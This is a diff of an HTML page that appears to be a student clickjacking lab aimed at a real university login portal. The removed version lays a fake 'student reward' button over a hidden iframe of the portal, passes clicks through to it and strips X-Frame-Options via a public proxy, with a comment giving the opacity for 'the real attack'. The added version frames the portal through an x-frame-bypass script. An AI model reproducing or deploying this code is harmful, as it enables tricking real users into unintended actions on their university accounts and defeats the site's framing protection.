@@ -2,61 +2,28 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clickjacking Professional Lab</title>
+    <title>إختبار ظهور موقع الجامعة</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: sans-serif; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: auto; }
         
-        /* طبقة الجائزة (المصيدة) */
-        #decoy {
-            position: absolute; width: 100%; height: 100%;
-            background: white; display: flex; flex-direction: column;
-            align-items: center; justify-content: center; z-index: 10;
-            pointer-events: none; /* تجعل النقرات تمر عبرها للموقع المخفي */
-        }
-
-        .prize-btn {
-            background-color: #007bff; color: white; padding: 15px 60px;
-            border: none; border-radius: 8px; font-size: 20px;
-            margin-top: 360px; /* هذا الرقم يضعه فوق زر دخول نظام الجامعة بالضبط */
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-        }
-
-        /* الإطار المخفي - موقع الجامعة */
+        /* إطار الموقع - جعلناه ظاهراً تماماً للتأكد */
         #target-frame {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            border: none; z-index: 5;
-            opacity: 0.5; /* اجعلها 0.5 ليراها الدكتور، و 0 للهجوم الحقيقي */
+            width: 100%;
+            height: 100vh;
+            border: 5px solid red; /* إطار أحمر للتأكد من مكان الموقع */
         }
     </style>
 </head>
 <body>
 
-    <div id="decoy">
-        <h1 style="color: #28a745;">🎁 مبروك! مكافأة الطالب المتميز</h1>
-        <p>اضغط أدناه لتنشيط حسابك واستلام الجائزة</p>
-        <button class="prize-btn">تنشيط الحساب واستلام الجائزة</button>
-    </div>
+    <h2 style="text-align:center; color:blue;">جاري تحميل موقع الجامعة عبر البروكسي...</h2>
 
-    <iframe id="target-frame"></iframe>
-
-    <script>
-        const targetUrl = 'https://portal.ust.edu.ye';
-        const proxyUrl = 'https://api.allorigins.win/get?url=' + encodeURIComponent(targetUrl);
-
-        fetch(proxyUrl)
-            .then(response => {
-                if (response.ok) return response.json();
-                throw new Error('Network response was not ok.');
-            })
-            .then(data => {
-                const frame = document.getElementById('target-frame');
-                
-                let html = data.contents;
-                
-                html = html.replace(/X-Frame-Options/gi, "UNUSED_HEADER");
-                frame.srcdoc = html;
-            });
+    <script type="module">
+        import { xFrameBypass } from 'https://unpkg.com/x-frame-bypass@1.0.2/x-frame-bypass.js';
+        customElements.define('x-frame-bypass', xFrameBypass, {extends: 'iframe'});
     </script>
+
+    <iframe is="x-frame-bypass" id="target-frame" src="https://portal.ust.edu.ye"></iframe>
+
 </body>
 </html>
